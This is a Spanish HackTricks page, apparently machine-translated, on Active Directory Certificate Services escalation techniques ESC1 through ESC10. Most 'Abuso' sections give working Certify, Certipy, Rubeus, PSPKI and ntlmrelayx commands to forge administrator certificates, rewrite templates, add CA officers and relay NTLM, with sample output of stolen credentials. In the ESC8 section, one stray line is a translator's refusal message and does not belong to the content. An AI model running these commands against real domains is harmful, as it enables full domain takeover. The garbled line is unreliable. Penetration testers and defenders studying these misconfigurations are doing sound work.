# Escalación de Dominio en AD CS

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Plantillas de Certificados Mal Configuradas - ESC1

### Explicación

* La **CA Empresarial** otorga **derechos de inscripción a usuarios con privilegios bajos**
* **La aprobación del gestor está desactivada**
* **No se requieren firmas autorizadas**
* Un **descriptor de seguridad de plantilla de certificado** excesivamente permisivo **otorga derechos de inscripción de certificados a usuarios con privilegios bajos**
* La **plantilla de certificado define EKUs que habilitan la autenticación**:
* _Autenticación de Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de Cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de Sesión con Tarjeta Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier Propósito (OID 2.5.29.37.0), o sin EKU (SubCA)._
* La **plantilla de certificado permite a los solicitantes especificar un subjectAltName en el CSR:**
* **AD** **utilizará** la identidad especificada por el campo **subjectAltName** (SAN) de un certificado **si está presente**. En consecuencia, si un solicitante puede especificar el SAN en un CSR, el solicitante puede **solicitar un certificado como cualquier persona** (por ejemplo, un usuario administrador de dominio). El objeto AD de la plantilla de certificado **especifica** si el solicitante **puede especificar el SAN** en su propiedad **`mspki-certificate-name-`**`flag`. La propiedad `mspki-certificate-name-flag` es una **máscara de bits** y si la bandera **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** está **presente**, un **solicitante puede especificar el SAN.**

{% hint style="danger" %}
Estos ajustes permiten a un **usuario con privilegios bajos solicitar un certificado con un SAN arbitrario**, permitiendo al usuario con privilegios bajos autenticarse como cualquier principal en el dominio a través de Kerberos o SChannel.
{% endhint %}

Esto a menudo está habilitado, por ejemplo, para permitir que productos o servicios de despliegue generen certificados HTTPS o certificados de host al vuelo. O debido a la falta de conocimiento.

Tenga en cuenta que cuando se crea un certificado con esta última opción aparece una **advertencia**, pero no aparece si una **plantilla de certificado** con esta configuración es **duplicada** (como la plantilla `WebServer` que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado y luego el administrador podría añadir un OID de autenticación).

### Abuso

Para **encontrar plantillas de certificados vulnerables** puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad e impersonar a un administrador** se podría ejecutar:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Luego puedes transformar el certificado generado a formato **`.pfx`** y usarlo para **autenticarte usando Rubeus o certipy** de nuevo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" pueden ser utilizados indebidamente para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Además, la siguiente consulta LDAP al ejecutarse contra el esquema de configuración del Bosque de AD puede ser utilizada para **enumerar** **plantillas de certificados** que **no requieren aprobación/firmas**, que tienen un **EKU de Autenticación de Cliente o Inicio de Sesión con Tarjeta Inteligente**, y tienen habilitada la bandera **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`**:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de Certificados Mal Configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. La CA Empresarial otorga derechos de inscripción a usuarios con bajos privilegios.
2. La aprobación del gerente está deshabilitada.
3. No se requieren firmas autorizadas.
4. Un descriptor de seguridad de plantilla de certificado demasiado permisivo otorga derechos de inscripción de certificados a usuarios con bajos privilegios.
5. **La plantilla de certificado define el EKU de Cualquier Propósito o ningún EKU.**

El **EKU de Cualquier Propósito** permite a un atacante obtener un **certificado** para **cualquier propósito** como autenticación de cliente, autenticación de servidor, firma de código, etc. Se puede usar la misma **técnica que para ESC3** para abusar de esto.

Un **certificado sin EKUs** — un certificado de CA subordinada — puede ser abusado para **cualquier propósito** también, pero podría **también usarlo para firmar nuevos certificados**. Como tal, utilizando un certificado de CA subordinada, un atacante podría **especificar EKUs arbitrarios o campos en los nuevos certificados.**

Sin embargo, si la **CA subordinada no es confiable** por el objeto **`NTAuthCertificates`** (lo cual no será por defecto), el atacante **no puede crear nuevos certificados** que funcionen para **autenticación de dominio**. Aún así, el atacante puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios, de los cuales hay **abundancia** que el atacante podría potencialmente **abusar** (por ejemplo, firma de código, autenticación de servidor, etc.) y podría tener grandes implicaciones para otras aplicaciones en la red como SAML, AD FS o IPSec.

La siguiente consulta LDAP cuando se ejecuta contra el esquema de configuración del Bosque de AD se puede utilizar para enumerar plantillas que coincidan con este escenario:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Agente de Inscripción Mal Configuradas - ESC3

### Explicación

Este escenario es similar al primero y segundo, pero **abusando** de un **EKU diferente** (Agente de Solicitud de Certificado) y **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos),

El **EKU de Agente de Solicitud de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Agente de Inscripción** en la documentación de Microsoft, permite a un principal **inscribirse** para obtener un **certificado** **en nombre de otro usuario**.

El **"agente de inscripción"** se inscribe en dicha **plantilla** y utiliza el **certificado resultante para co-firmar una CSR en nombre del otro usuario**. Luego **envía** la **CSR co-firmada** a la AC, inscribiéndose en una **plantilla** que **permite "inscribir en nombre de"**, y la AC responde con un **certificado perteneciente al "otro" usuario**.

**Requisitos 1:**

1. La AC Empresarial permite derechos de inscripción a usuarios con bajos privilegios.
2. La aprobación del gerente está desactivada.
3. No se requieren firmas autorizadas.
4. Un descriptor de seguridad de plantilla de certificado demasiado permisivo permite derechos de inscripción de certificados a usuarios con bajos privilegios.
5. La **plantilla de certificado define el EKU de Agente de Solicitud de Certificado**. El OID de Agente de Solicitud de Certificado (1.3.6.1.4.1.311.20.2.1) permite solicitar otras plantillas de certificado en nombre de otros principios.

**Requisitos 2:**

1. La AC Empresarial permite derechos de inscripción a usuarios con bajos privilegios.
2. La aprobación del gerente está desactivada.
3. **La versión del esquema de la plantilla es 1 o es mayor que 2 y especifica un Requisito de Emisión de Política de Aplicación que requiere el EKU de Agente de Solicitud de Certificado.**
4. La plantilla de certificado define un EKU que permite la autenticación de dominio.
5. No se implementan restricciones de agente de inscripción en la AC.

### Abuso

Puedes usar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Las CA empresariales pueden **restringir** a los **usuarios** que pueden **obtener** un **certificado de agente de inscripción**, las plantillas en las que los agentes de inscripción pueden inscribirse y en qué **cuentas** el agente de inscripción puede **actuar en nombre de** abriendo el `snap-in certsrc.msc -> haciendo clic derecho en la CA -> haciendo clic en Propiedades -> navegando` a la pestaña "Agentes de inscripción".

Sin embargo, la configuración **predeterminada** de la CA es "**No restringir a los agentes de inscripción**". Incluso cuando los administradores habilitan "Restringir a los agentes de inscripción", la configuración predeterminada es extremadamente permisiva, permitiendo que Todos accedan a inscribirse en todas las plantillas como cualquiera.

## Control de Acceso Vulnerable en Plantillas de Certificados - ESC4

### **Explicación**

Las **plantillas de certificados** tienen un **descriptor de seguridad** que especifica qué **principales** de AD tienen **permisos específicos sobre la plantilla**.

Si un **atacante** tiene suficientes **permisos** para **modificar** una **plantilla** y **crear** cualquiera de las **configuraciones erróneas** explotables de las **secciones anteriores**, podrá explotarla y **escalar privilegios**.

Derechos interesantes sobre plantillas de certificados:

* **Owner:** Control total implícito del objeto, puede editar cualquier propiedad.
* **FullControl:** Control total del objeto, puede editar cualquier propiedad.
* **WriteOwner:** Puede modificar el propietario a un principal controlado por el atacante.
* **WriteDacl**: Puede modificar el control de acceso para otorgar al atacante FullControl.
* **WriteProperty:** Puede editar cualquier propiedad.

### Abuso

Un ejemplo de un privesc como el anterior:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 ocurre cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto puede, por ejemplo, ser abusado para sobrescribir la configuración de la plantilla de certificado para hacer la plantilla vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene el nuevo borde `AddKeyCredentialLink` a `JOHNPC`. Dado que esta técnica está relacionada con certificados, también he implementado este ataque, que se conoce como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aquí hay un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el parámetro **`-save-old` para guardar la configuración antigua**, lo cual será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de Acceso a Objetos PKI Vulnerables - ESC5

### Explicación

La red de relaciones basadas en ACL que pueden afectar la seguridad de AD CS es extensa. Varios **objetos fuera de las plantillas de certificados** y la propia autoridad de certificación pueden tener un **impacto en la seguridad de todo el sistema AD CS**. Estas posibilidades incluyen (pero no se limitan a):

* El **objeto de computadora AD del servidor CA** (es decir, compromiso a través de S4U2Self o S4U2Proxy)
* El **servidor RPC/DCOM del servidor CA**
* Cualquier **objeto AD descendiente o contenedor en el contenedor** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` (por ejemplo, el contenedor de Plantillas de Certificados, el contenedor de Autoridades de Certificación, el objeto NTAuthCertificates, el Contenedor de Servicios de Inscripción, etc.)

Si un atacante con bajos privilegios puede **tomar control de cualquiera de estos**, el ataque probablemente **comprometerá el sistema PKI**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

Hay otro problema similar, descrito en la [**publicación de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), que involucra la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Como describe Microsoft, “**Si** esta bandera está **activada** en la CA, **cualquier solicitud** (incluyendo cuando el sujeto se construye desde Active Directory®) puede tener **valores definidos por el usuario** en el **nombre alternativo del sujeto**.”\
Esto significa que un **atacante** puede inscribirse en **CUALQUIER plantilla** configurada para autenticación de dominio que también **permita a usuarios no privilegiados** inscribirse (por ejemplo, la plantilla de Usuario predeterminada) y **obtener un certificado** que nos permita **autenticarnos** como administrador de dominio (o **cualquier otro usuario/máquina activo**).

**Nota**: los **nombres alternativos** aquí se **incluyen** en una CSR a través del argumento `-attrib "SAN:"` para `certreq.exe` (es decir, “Pares de Nombre Valor”). Esto es **diferente** al método para **abusar de SANs** en ESC1 ya que **almacena información de la cuenta en un atributo de certificado vs una extensión de certificado**.

### Abuso

Las organizaciones pueden **verificar si la configuración está habilitada** usando el siguiente comando de `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Debajo, esto simplemente utiliza **remote** **registry**, por lo que el siguiente comando también podría funcionar:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) también verifican esto y pueden ser utilizados para abusar de esta mala configuración:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Estos ajustes pueden ser **establecidos**, asumiendo derechos de **administrador del dominio** (o equivalentes), desde cualquier sistema:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Si encuentras esta configuración en tu entorno, puedes **eliminar esta bandera** con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Después de las actualizaciones de seguridad de mayo de 2022, los nuevos **certificados** tendrán una **extensión de seguridad** que **incorpora** la propiedad **`objectSid` del solicitante**. Para ESC1, esta propiedad se reflejará desde el SAN especificado, pero con **ESC6**, esta propiedad refleja el **`objectSid` del solicitante**, y no del SAN.\
Como tal, **para abusar de ESC6**, el entorno debe ser **vulnerable a ESC10** (Mapeos de Certificados Débiles), donde se **prefiere el SAN sobre la nueva extensión de seguridad**.
{% endhint %}

## Control de Acceso Vulnerable de Autoridad de Certificación - ESC7

### Ataque 1

#### Explicación

Una autoridad de certificación en sí tiene un **conjunto de permisos** que aseguran varias **acciones de CA**. Estos permisos se pueden acceder desde `certsrv.msc`, haciendo clic derecho en una CA, seleccionando propiedades y cambiando a la pestaña de Seguridad:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

Esto también se puede enumerar a través del [**módulo de PSPKI**](https://www.pkisolutions.com/tools/pspki/) con `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### Abuso

Si tienes un principal con derechos **`ManageCA`** en una **autoridad de certificación**, podemos usar **PSPKI** para cambiar remotamente el bit **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para **permitir la especificación de SAN** en cualquier plantilla ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Esto también es posible de una forma más sencilla con el cmdlet [**PSPKI’s Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx).

Los derechos **`ManageCertificates`** permiten **aprobar una solicitud pendiente**, evitando así la protección de "aprobación del gestor de certificados de CA".

Puedes usar una **combinación** de **Certify** y el módulo **PSPKI** para solicitar un certificado, aprobarlo y descargarlo:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

{% hint style="warning" %}
En el **ataque anterior**, se utilizaron los permisos **`Manage CA`** para **habilitar** la bandera **EDITF\_ATTRIBUTESUBJECTALTNAME2** para realizar el ataque **ESC6**, pero esto no tendrá efecto hasta que el servicio de CA (`CertSvc`) se reinicie. Cuando un usuario tiene el derecho de acceso `Manage CA`, también se le permite **reiniciar el servicio**. Sin embargo, **esto no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6 podría no funcionar directamente** en la mayoría de los entornos actualizados debido a las actualizaciones de seguridad de mayo de 2022.
{% endhint %}

Por lo tanto, se presenta aquí otro ataque.

Prerrequisitos:

* Solo permiso **`ManageCA`**
* Permiso **`Manage Certificates`** (puede ser otorgado desde **`ManageCA`**)
* La plantilla de certificado **`SubCA`** debe estar **habilitada** (puede ser habilitada desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con los derechos de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificados fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Por lo tanto, un **usuario** puede **solicitar** inscribirse en **`SubCA`** - lo cual será **denegado** - pero **luego emitido por el gestor después**.

#### Abuso

Puedes **otorgarte el derecho de acceso `Manage Certificates`** añadiendo tu usuario como un nuevo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** puede ser **habilitada en la CA** con el parámetro `-enable-template`. Por defecto, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido con los requisitos previos para este ataque, podemos comenzar **solicitando un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denegada**, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestros **`Manage CA` y `Manage Certificates`**, podemos entonces **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay a puntos finales HTTP de AD CS – ESC8

### Explicación

{% hint style="info" %}
En resumen, si un entorno tiene **AD CS instalado**, junto con un **punto final de inscripción web vulnerable** y al menos una **plantilla de certificado publicada** que permite la **inscripción de computadoras del dominio y autenticación de cliente** (como la plantilla predeterminada **`Machine`**), entonces un **atacante puede comprometer CUALQUIER computadora con el servicio de spooler en ejecución**!
{% endhint %}

AD CS admite varios **métodos de inscripción basados en HTTP** a través de roles adicionales del servidor AD CS que los administradores pueden instalar. Estas interfaces de inscripción de certificados basadas en HTTP son todas **vulnerables a ataques de retransmisión NTLM**. Utilizando la retransmisión NTLM, un atacante en una **máquina comprometida puede suplantar cualquier cuenta de AD que autentique NTLM entrante**. Mientras suplanta la cuenta de la víctima, un atacante podría acceder a estas interfaces web y **solicitar un certificado de autenticación de cliente basado en las plantillas de certificado `User` o `Machine`**.

* La **interfaz de inscripción web** (una aplicación ASP de aspecto antiguo accesible en `http://<caserver>/certsrv/`), por defecto solo admite HTTP, que no puede proteger contra ataques de retransmisión NTLM. Además, explícitamente solo permite la autenticación NTLM a través de su encabezado HTTP de Autorización, por lo que protocolos más seguros como Kerberos son inutilizables.
* El **Servicio de Inscripción de Certificados** (CES), el Servicio Web de **Política de Inscripción de Certificados** (CEP) y el **Servicio de Inscripción de Dispositivos de Red** (NDES) admiten autenticación de negociación por defecto a través de su encabezado HTTP de Autorización. La autenticación de negociación **admite** Kerberos y **NTLM**; en consecuencia, un atacante puede **negociar hasta la autenticación NTLM** durante ataques de retransmisión. Estos servicios web al menos habilitan HTTPS por defecto, pero desafortunadamente HTTPS por sí solo **no protege contra ataques de retransmisión NTLM**. Solo cuando HTTPS se combina con enlace de canal pueden los servicios HTTPS estar protegidos de ataques de retransmisión NTLM. Desafortunadamente, AD CS no habilita la Protección Extendida para Autenticación en IIS, que es necesaria para habilitar el enlace de canal.

Los **problemas** comunes con los ataques de retransmisión NTLM son que las **sesiones NTLM suelen ser cortas** y que el atacante **no puede** interactuar con servicios que **exigen firma NTLM**.

Sin embargo, abusar de un ataque de retransmisión NTLM para obtener un certificado para el usuario resuelve estas limitaciones, ya que la sesión vivirá tanto como el certificado sea válido y el certificado se puede usar para usar servicios **que exigen firma NTLM**. Para saber cómo usar un cert robado, consulta:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Otra limitación de los ataques de retransmisión NTLM es que **requieren que una cuenta de víctima se autentique en una máquina controlada por el atacante**. Un atacante podría esperar o intentar **forzarlo**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)’s `cas` command can enumerate **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Las CA empresariales también **almacenan puntos finales de CES** en su objeto de AD en la propiedad `msPKI-Enrollment-Servers`. **Certutil.exe** y **PSPKI** pueden analizar y listar estos puntos finales:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Como no se proporcionó texto en inglés para traducir, no puedo realizar la traducción solicitada. Si proporcionas el texto en inglés relevante, estaré encantado de ayudarte con la traducción al español.
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

Por defecto, Certipy solicitará un certificado basado en la plantilla `Machine` o `User` dependiendo de si el nombre de la cuenta retransmitida termina con `$`. Es posible especificar otra plantilla con el parámetro `-template`.

Luego podemos usar una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Para los controladores de dominio, debemos especificar `-template DomainController`.
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sin Extensión de Seguridad - ESC9 <a href="#5485" id="5485"></a>

### Explicación

ESC9 se refiere al nuevo valor de **`msPKI-Enrollment-Flag`** **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`). Si esta bandera está establecida en una plantilla de certificado, la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** **no** será incrustada. ESC9 solo es útil cuando `StrongCertificateBindingEnforcement` está configurado en `1` (por defecto), ya que una configuración de mapeo de certificados más débil para Kerberos o Schannel puede ser abusada como ESC10 — sin ESC9 — ya que los requisitos serán los mismos.

* `StrongCertificateBindingEnforcement` no está configurado en `2` (por defecto: `1`) o `CertificateMappingMethods` contiene la bandera `UPN`
* El certificado contiene la bandera `CT_FLAG_NO_SECURITY_EXTENSION` en el valor de `msPKI-Enrollment-Flag`
* El certificado especifica cualquier EKU de autenticación de cliente
* `GenericWrite` sobre cualquier cuenta A para comprometer cualquier cuenta B

### Abuso

En este caso, `John@corp.local` tiene `GenericWrite` sobre `Jane@corp.local`, y queremos comprometer `Administrator@corp.local`. A `Jane@corp.local` se le permite inscribirse en la plantilla de certificado `ESC9` que especifica la bandera `CT_FLAG_NO_SECURITY_EXTENSION` en el valor de `msPKI-Enrollment-Flag`.

Primero, obtenemos el hash de `Jane` con, por ejemplo, Shadow Credentials (usando nuestro `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

Luego, cambiamos el `userPrincipalName` de `Jane` para que sea `Administrator`. Nota que estamos omitiendo la parte de `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

Esto no es una violación de restricción, ya que el `userPrincipalName` del usuario `Administrator` es `Administrator@corp.local` y no `Administrator`.

Ahora, solicitamos la plantilla de certificado vulnerable `ESC9`. Debemos solicitar el certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Nota que el `userPrincipalName` en el certificado es `Administrator` y que el certificado emitido no contiene "object SID".

Luego, cambiamos de nuevo el `userPrincipalName` de `Jane` a ser algo más, como su `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Ahora, si intentamos autenticarnos con el certificado, recibiremos el hash NT del usuario `Administrator@corp.local`. Necesitarás agregar `-domain <domain>` a tu línea de comandos ya que no hay un dominio especificado en el certificado.

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Mapeos de Certificados Débiles - ESC10

### Explicación

ESC10 se refiere a dos valores de clave de registro en el controlador de dominio.

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Valor por defecto `0x18` (`0x8 | 0x10`), anteriormente `0x1F`.

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Valor por defecto `1`, anteriormente `0`.

**Caso 1**

`StrongCertificateBindingEnforcement` configurado en `0`

**Caso 2**

`CertificateMappingMethods` contiene el bit `UPN` (`0x4`)

### Caso de Abuso 1

* `StrongCertificateBindingEnforcement` configurado en `0`
* `GenericWrite` sobre cualquier cuenta A para comprometer cualquier cuenta B

En este caso, `John@corp.local` tiene `GenericWrite` sobre `Jane@corp.local`, y queremos comprometer `Administrator@corp.local`. Los pasos de abuso son casi idénticos a ESC9, excepto que se puede usar cualquier plantilla de certificado.

